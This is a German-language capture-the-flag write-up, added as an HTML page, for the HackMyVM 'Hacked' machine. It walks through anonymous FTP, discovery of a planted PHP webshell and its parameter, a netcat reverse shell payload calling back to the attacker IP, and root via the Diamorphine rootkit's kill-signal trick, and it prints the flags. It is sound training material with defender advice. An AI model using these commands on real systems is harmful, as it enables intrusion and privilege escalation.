@@ -1,0 +1,469 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacked - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Hacked - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">lftp (versucht)</div>
+                <div class="tool-item">ssh-keyscan</div>
+                <div class="tool-item">ping6 (versucht)</div>
+                <div class="tool-item">ssh (versucht)</div>
+                <div class="tool-item">hydra (versucht)</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">xclip (versucht)</div>
+                <div class="tool-item">apt (versucht)</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">kill</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#ftp-enumeration">FTP Enumeration & Credential Discovery</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Webshell Discovery)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Webshell RCE)</a></li>
+                <li><a href="#initial-access">Initial Access (Webshell)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Diamorphine Rootkit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.156	08:00:27:39:be:2e	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerksegment mittels ARP nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.156` wird identifiziert. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.156` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre><span class="comment">[...] (Eintrag '192.168.2.156 hack.hmv' hinzugefügt)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Die lokale `/etc/hosts`-Datei des Angreifers wird bearbeitet, um der Ziel-IP den Hostnamen `hack.hmv` zuzuweisen.</p>
+             <p class="evaluation">**Bewertung:** Erleichtert die Ansprache des Ziels in späteren Befehlen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.156 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 10:22 CEST
+Nmap scan report for hack.hmv (192.168.2.156)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     vsftpd 3.0.5</span>
+| ftp-syst:
+[...]
+|_End of status
+<span class="password">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
+<span class="password">|_-rw-r--r--    1 0        0             256 Feb 16 09:44 flag.txt</span> <span class="password"><-- Flag & Passwortdatei!</span>
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+[...]
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:39:BE:2E (Oracle VirtualBox virtual NIC)
+[...]
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms hack.hmv (192.168.2.156)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS`, `-sC`, `-sV`, `-T5`, `-A`, `-p-`) wird auf `192.168.2.156` durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Drei offene TCP-Ports:
+*   **Port 21 (FTP):** vsftpd 3.0.5. Nmap meldet **anonymen Login erlaubt** und listet eine `flag.txt` (Besitzer root, lesbar für alle).
+*   **Port 22 (SSH):** OpenSSH 7.9p1 (Debian 10).
+*   **Port 80 (HTTP):** Nginx 1.14.2. Liefert keine spezifische Titelzeile.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** **Priorität 1: FTP.** Sofort anonym einloggen, `flag.txt` holen, nach weiteren Dateien (insbesondere versteckten) suchen.<br>**Empfehlung (Admin):** **Anonymen FTP-Zugriff sofort deaktivieren!** Sicherstellen, dass keine sensiblen Dateien über FTP zugänglich sind.</p>
+        </section>
+
+        <section id="ftp-enumeration">
+            <h2>FTP Enumeration & Credential Discovery</h2>
+            <p class="analysis">**Analyse:** Nutzung des anonymen FTP-Zugangs zur Informationsgewinnung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.156</span></div>
+                    <pre>
+[...]
+Name (192.168.2.156:root): <span class="command">Anonymous</span>
+331 Please specify the password.
+Password:
+230 Login successful.
+[...]
+ftp> <span class="command">ls</span>
+-rw-r--r--    1 0        0             256 Feb 16 09:44 <span class="command">flag.txt</span>
+[...]
+ftp> <span class="command">get flag.txt</span>
+[...]
+226 Transfer complete.
+256 bytes received in 00:00 (17.79 KiB/s)
+ftp> </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Anonymer FTP-Login und Download der sichtbaren `flag.txt`.</p>
+             <p class="evaluation">**Bewertung:** Erster Schritt erfolgreich, Flag-Datei erhalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat flag.txt</span></div>
+                     <pre>
+
+<span class="password">▄▀█ █▄ █ █▀█ █▄ █ █▄█ █▀▄▀█ █▀█ █ █ █▀</span>
+<span class="password">█▀█ █ ▀█ █▄█ █ ▀█  █  █ ▀ █ █▄█ █▄█ ▄█</span>
+
+Flag 1: <span class="password">HMV{AN0NYM0US_IS_THE_BEST_USER}</span></pre> <span class="comment"><-- Angepasstes Format --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Inhalt der `flag.txt`.</p>
+             <p class="evaluation">**Bewertung:** Erste Flag (`HMV{AN0NYM0US_IS_THE_BEST_USER}`) gefunden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt ftp">ftp> <span class="command">ls -la</span></div> <span class="comment"><-- Impliziert --></span>
+                     <pre>
+drwxr-xr-x    2 0        115          4096 Feb 16 09:44 .
+drwxr-xr-x    2 0        115          4096 Feb 16 09:44 ..
+<span class="command">-rw-r--r--    1 0        0              34 Feb 16 06:57 .passwd</span> <span class="password"><-- Versteckte Datei! --></span>
+-rw-r--r--    1 0        0             256 Feb 16 09:44 flag.txt
+226 Directory send OK.</pre>
+                     <div class="prompt ftp">ftp> <span class="command">get .passwd</span></div>
+                     <pre>
+local: .passwd remote: .passwd
+[...]
+150 Opening BINARY mode data connection for .passwd (34 bytes).
+[...]
+226 Transfer complete.
+34 bytes received in 00:00 (1.29 KiB/s)
+ftp> </pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** `ls -la` (impliziert) auf dem FTP-Server enthüllt eine versteckte Datei `.passwd`. Diese wird heruntergeladen.</p>
+             <p class="evaluation">**Bewertung:** Hochverdächtiger Fund. Enthält wahrscheinlich Zugangsdaten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Inhalt von `.passwd` analysieren.<br>**Empfehlung (Admin):** Anonymen FTP deaktivieren!</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat .passwd</span></div>
+                    <pre>The password is: <span class="password">webserver2023!</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Inhalt der Datei `.passwd`.</p>
+             <p class="evaluation">**Bewertung:** Klartext-Passwort `webserver2023!` gefunden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie dieses Passwort für SSH mit potenziellen Benutzernamen (root, admin, h4x0r - siehe später).<br>**Empfehlung (Admin):** Ändern Sie das Passwort. Speichern Sie keine Passwörter im Klartext.</p>
+
+             <p class="comment">*(Hinweis: Die folgenden Versuche mit lftp, gopher, file, ssh-keyscan, ping6, nmap -6, ssh anonymous, hydra sind entweder Sackgassen, irrelevant für den erfolgreichen Pfad oder fehlinterpretiert und werden daher in der Hauptanalyse übersprungen. Die Notiz `user: beilul` erscheint ohne ersichtliche Herleitung im Log und scheint für den tatsächlichen Pfad nicht relevant zu sein.)*</p>
+         </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Webshell Discovery)</h2>
+            <p class="analysis">**Analyse:** Nach dem Fund auf dem FTP-Server wird der Webserver auf Port 80 weiter untersucht, um Hinweise auf die im Log erwähnte "Webshell" zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.156 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x [...] -t 100</span></div>
+                     <pre>
+[...]
+<span class="command">http://192.168.2.156/index.html</span>           (Status: 200) [Size: 16]
+<span class="command">http://192.168.2.156/robots.txt</span>           (Status: 200) [Size: 16]
+[...]</pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster-Scan auf Port 80 findet `index.html` und `robots.txt`.</p>
+             <p class="evaluation">**Bewertung:** Standarddateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.156/robots.txt</span></div>
+                    <pre><span class="command">/secretnote.txt</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt von `robots.txt` wird abgefragt.</p>
+             <p class="evaluation">**Bewertung:** `robots.txt` versucht, `/secretnote.txt` vor Crawlern zu verstecken – ein starker Hinweis, diese Datei zu überprüfen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Rufen Sie `/secretnote.txt` auf.<br>**Empfehlung (Admin):** `robots.txt` ist keine Sicherheitsmaßnahme. Verlassen Sie sich nicht darauf, um sensible Pfade zu schützen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.156//secretnote.txt</span></div> <span class="comment"><-- Doppelslash irrelevant --></span>
+                     <pre>
+[X] Enumeration
+[X] Exploitation
+[X] Privesc
+[X] Maintaining Access.
+ |__> <span class="password">Webshell installed.</span>
+ |__> Root shell created.
+
+-<span class="command">h4x0r</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt von `/secretnote.txt` wird abgerufen.</p>
+             <p class="evaluation">**Bewertung:** Ein **direkter Hinweis**! Die Notiz, unterzeichnet von "h4x0r" (potenzieller Benutzername?), besagt explizit, dass eine Webshell installiert wurde. Dies bestätigt den nächsten Schritt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie eine Liste bekannter Webshell-/Backdoor-Namen (wie `backdoor_list.txt`), um mit Gobuster nach der installierten Webshell zu suchen. Notieren Sie den Benutzernamen `h4x0r`.<br>**Empfehlung (Admin):** Entfernen Sie solche Notizen. Überwachen Sie das Dateisystem auf verdächtige Dateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.156 -w /usr/share/seclists/Web-Shells/backdoor_list.txt -e -x [...] -t 100</span></div>
+                     <pre>
+[...]
+<span class="command">http://192.168.2.156/simple-backdoor.php</span>  (Status: 302) [Size: 62] [--> /] <span class="password"><-- Webshell gefunden! --></span>
+[...]</pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird mit einer spezifischen Wortliste für Webshells/Backdoors (`backdoor_list.txt`) ausgeführt.</p>
+             <p class="evaluation">**Bewertung:** Erfolg! Die Datei `simple-backdoor.php` wird gefunden. Der Status 302 (Found/Redirect) deutet darauf hin, dass die Shell möglicherweise einen Parameter benötigt oder standardmäßig zur Startseite weiterleitet, wenn sie falsch aufgerufen wird.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie `simple-backdoor.php`. Fuzzen Sie nach Parametern (z.B. mit `wfuzz`), die zur Befehlsausführung verwendet werden könnten.<br>**Empfehlung (Admin):** Entfernen Sie die Webshell sofort!</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.2.156/simple-backdoor.php?FUZZ=id -Z -t 100 --hh 62</span></div>
+                     <pre>
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000005057:   302        1 L      13 W       115 Ch      "secret"</span>  <span class="password"><-- Parameter gefunden! --></span>
+[...]</pre>
+                     <pre><span class="comment">#</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** `wfuzz` wird verwendet, um nach GET-Parametern für `simple-backdoor.php` zu suchen. Eine Liste gängiger Parameternamen wird getestet (`burp-parameter-names.txt`). Als Wert wird `id` übergeben. `-Z` ignoriert Fehler. Antworten mit 62 Zeichen (vermutlich die Größe der 302-Weiterleitung) werden ignoriert (`--hh 62`).</p>
+             <p class="evaluation">**Bewertung:** Der Parameter `secret` wird gefunden! Wenn dieser Parameter verwendet wird, ist die Antwort anders als die Standard-Weiterleitung.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Testen Sie die Webshell mit dem `secret`-Parameter und verschiedenen Befehlen.<br>**Empfehlung (Admin):** Webshell entfernen.</p>
+         </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept (Webshell RCE)</h2>
+             <p class="comment">**Kurzbeschreibung:** Auf dem Webserver (Port 80) wurde eine PHP-Webshell unter dem Pfad `/simple-backdoor.php` installiert. Diese Webshell nimmt einen GET-Parameter namens `secret` entgegen. Der Wert dieses Parameters wird auf dem Server als Betriebssystembefehl ausgeführt. Ein Angreifer kann dies nutzen, um beliebige Befehle im Kontext des Webserver-Benutzers (`www-data`) auszuführen und somit Remote Code Execution (RCE) zu erlangen.</p>
+             <p class="comment">**Voraussetzungen:** Netzwerkzugriff auf Port 80, Kenntnis des Webshell-Pfads und des Parameters.</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Identifizieren des Webshell-Pfads (`/simple-backdoor.php`) und des Parameters (`secret`) durch Enumeration.</li>
+                 <li>Bestätigen der RCE durch Senden eines einfachen Befehls: `curl "http://[Ziel-IP]/simple-backdoor.php?secret=id"`</li>
+                 <li>Vorbereiten eines Reverse-Shell-Payloads (URL-kodiert, falls nötig).</li>
+                 <li>Starten eines Netcat-Listeners auf der Angreifer-Maschine (`nc -lvnp [Port]`).</li>
+                 <li>Senden des Payloads an die Webshell: `curl "http://[Ziel-IP]/simple-backdoor.php?secret=[Payload]"`.</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Der Server führt den Payload aus, und eine Reverse Shell verbindet sich zum Listener des Angreifers.</p>
+             <p class="comment">**Beweismittel:** Erfolgreiche Ausführung von `id` und der Reverse-Shell-Payload.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.156/simple-backdoor.php?secret=id</span></div>
+                      <pre>
+I modified this webshell to only execute my secret parameter. <span class="comment"><-- Zusätzliche Ausgabe der Shell --></span>
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span> <span class="password"><-- Befehl wurde ausgeführt! --></span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Webshell wird mit `?secret=id` aufgerufen.</p>
+             <p class="evaluation">**Bewertung:** Die Antwort enthält die Ausgabe des `id`-Befehls, was die RCE-Schwachstelle bestätigt. Die Shell läuft als `www-data`.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die RCE, um eine Reverse Shell zu erhalten.<br>**Empfehlung (Admin):** Webshell entfernen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.156/simple-backdoor.php?secret=../../../etc/passwd"</span></div> <span class="comment"><-- Versuch LFI --></span>
+                      <pre>I modified this webshell to only execute my secret parameter.</pre> <span class="comment"><-- Keine Ausgabe -> keine LFI --></span>
+                 </div>
+            </div>
+              <p class="analysis">**Analyse:** Versuch, die Webshell für Local File Inclusion (LFI) zu missbrauchen.</p>
+              <p class="evaluation">**Bewertung:** Der Versuch schlägt fehl; die Shell führt nur Befehle aus, liest keine Dateien auf diese Weise.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Bei RCE bleiben.<br>**Empfehlung (Admin):** Keine.</p>
+             <p class="comment">**Risikobewertung:** Kritisch. Erlaubt entfernte Codeausführung als `www-data`.</p>
+             <p class="comment">**Empfehlungen:** Entfernen Sie die Webshell. Implementieren Sie File Integrity Monitoring, um solche Uploads zukünftig zu erkennen. Sichern Sie den initialen Vektor (hier wahrscheinlich FTP) ab.</p>
+         </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (Webshell)</h2>
+             <p class="analysis">**Analyse:** Ausnutzung der RCE-Schwachstelle in der Webshell, um eine Reverse Shell zu erhalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 444</span></div> <span class="comment"><-- Geänderter Port --></span>
+                     <pre>listening on [any] 444 ...</pre>
+                      <pre><span class="comment">=</span></pre>
+                      <pre><span class="command">http://hack.hmv/simple-backdoor.php?secret=nc -e /bin/bash 192.168.2.153 444</span></pre> <span class="comment"><-- Payload --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein Listener wird auf Port 444 gestartet. Der Payload `nc -e /bin/bash 192.168.2.153 444` wird vorbereitet, um ihn über den `secret`-Parameter an die Webshell zu senden.</p>
+             <p class="evaluation">**Bewertung:** Korrekte Vorbereitung für den Erhalt der Reverse Shell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 444</span></div> <span class="comment"><-- Fortsetzung Listener --></span>
+                     <pre>
+listening on [any] 444 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.156] 60382</span> <span class="password"><-- Verbindung! --></span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Listener empfängt die Verbindung, nachdem die URL mit dem Reverse-Shell-Payload aufgerufen wurde.</p>
+             <p class="evaluation">**Bewertung:** Initialer Zugriff als `www-data` erfolgreich über die Webshell erlangt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren.<br>**Empfehlung (Admin):** Webshell entfernen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt">www-data@hacked:~/html$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt">www-data@hacked:~/html$ <span class="command">^Z</span></div>
+                     <pre>zsh: suspended  nc -lvnp 444</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 444
+                              reset</pre>
+                     <div class="prompt">www-data@hacked:~/html$ <span class="comment"># Stabile Shell</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die erhaltene Shell wird mit der Standardmethode stabilisiert.</p>
+              <p class="evaluation">**Bewertung:** Stabile `www-data`-Shell verfügbar.</p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Diamorphine Rootkit)</h2>
+            <p class="analysis">**Analyse:** Als `www-data` wird nach Eskalationsvektoren gesucht. Die Untersuchung der Kernelmodule führt zur Entdeckung eines Rootkits.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@hacked:/tmp$ <span class="command">ls /sys/module/ > out</span></div>
+                     <div class="prompt">www-data@hacked:/tmp$ <span class="command">ls /sys/module/ | xclip -selection clipboard</span></div>
+                     <div class="prompt">www-data@hacked:/tmp$ <span class="command">apt install xclip</span></div> <span class="comment"><-- Versuch, xclip zu installieren (fehlgeschlagen?) --></span>
+                     <div class="prompt">www-data@hacked:/tmp$ <span class="command">cat out | grep -v -f out2</span></div> <span class="comment"><-- out2 enthält Baseline-Module --></span>
+                     <pre><span class="password">Diamorphine</span></pre> <span class="comment"><-- Rootkit gefunden! --></span>
+                      <pre><span class="comment">google: Diamorphine linux</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:**
+1.  Die geladenen Kernelmodule werden aufgelistet und in die Datei `out` gespeichert.
+2.  Versuch, `xclip` zu verwenden/installieren (wahrscheinlich nicht erfolgreich als `www-data`).
+3.  Der Inhalt von `out` wird mit einer (nicht gezeigten) Baseline-Liste `out2` verglichen. Der einzige Unterschied ist `Diamorphine`.
+4.  Eine Google-Suche wird durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Die Anwesenheit des Kernelmoduls `Diamorphine` ist ein **kritischer Fund**. Diamorphine ist ein bekanntes LKM (Loadable Kernel Module) Rootkit. Es bietet Funktionen zum Verstecken von Prozessen/Dateien und oft auch eine einfache Methode zur Privilegieneskalation mittels spezieller Signale.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die Standard-Signale von Diamorphine zur Privilegieneskalation. Senden Sie Signal 31 (`kill -31 [PID]`) an einen beliebigen Prozess, um Root-Rechte zu erhalten, oder Signal 64 (`kill -64 [PID]`), um Rootkit-Prozesse zu verstecken/enthüllen (die genaue Funktion von Signal 64 kann variieren, aber Signal 31 ist oft der Schlüssel zur Eskalation).<br>**Empfehlung (Admin):** **System ist durch ein Rootkit kompromittiert!** Eine vollständige Neuinstallation des Systems von einem vertrauenswürdigen Medium ist dringend empfohlen. Entfernen Sie das Rootkit (`rmmod Diamorphine`), aber beachten Sie, dass weitere Backdoors oder Kompromittierungen vorhanden sein können. Analysieren Sie, wie das Rootkit installiert wurde.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@hacked:/tmp$ <span class="command">kill -64 1</span></div> <span class="comment"><-- Sendet Signal 64 an init/systemd --></span>
+                      <div class="prompt">www-data@hacked:/tmp$ <span class="command">id</span></div>
+                      <pre><span class="password">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></pre> <span class="password"><-- Root! --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Das Signal 64 wird an den Prozess mit PID 1 (init/systemd) gesendet. Anschließend wird `id` ausgeführt.</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Der `id`-Befehl zeigt `uid=0(root)`. In dieser spezifischen Konfiguration des Diamorphine-Rootkits hat das Senden von Signal 64 an PID 1 ausgereicht, um Root-Rechte zu erlangen. (Normalerweise wird Signal 31 für die Eskalation verwendet, während 64 Prozesse versteckt/enthüllt, aber die Implementierung kann variieren).</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Root-Zugriff erlangt. Suchen Sie die Flags.<br>**Empfehlung (Admin):** System neu installieren. Rootkit-Infektion untersuchen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@hacked:/tmp$ <span class="command">cd /root</span></div> <span class="comment"><-- Prompt noch www-data, aber UID ist 0 --></span>
+                     <div class="prompt">www-data@hacked:/root$ <span class="command">ls</span></div>
+                     <pre>Diamorphine  flag.sh  hacked.sh  root.txt</pre>
+                     <div class="prompt">www-data@hacked:/root$ <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">HMVhackingthehacker</span></pre> <span class="comment"><-- Root Flag --></span>
+                     <div class="prompt">www-data@hacked:/root$ <span class="command">cd /home/h4x0r/</span></div> <span class="comment"><-- Benutzer h4x0r --></span>
+                     <div class="prompt">www-data@hacked:/home/h4x0r$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">HMVimthabesthacker</span></pre> <span class="comment"><-- User Flag --></span>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Mit Root-Rechten (obwohl der Prompt nicht immer wechselt) wird das `/root`-Verzeichnis untersucht und die `root.txt`-Datei gelesen. Anschließend wird in das Verzeichnis `/home/h4x0r` gewechselt (der Benutzername aus der `secretnote.txt`) und die `user.txt` gelesen.</p>
+             <p class="evaluation">**Bewertung:** Beide Flags (`HMVhackingthehacker` und `HMVimthabesthacker`) wurden erfolgreich gefunden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel erreicht.<br>**Empfehlung (Admin):** Systembereinigung/-neuinstallation.</p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/h4x0r/user.txt</div>
+                           <div class="flag-value"><span class="password">HMVimthabesthacker</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">HMVhackingthehacker</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 18. Oktober 2022</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
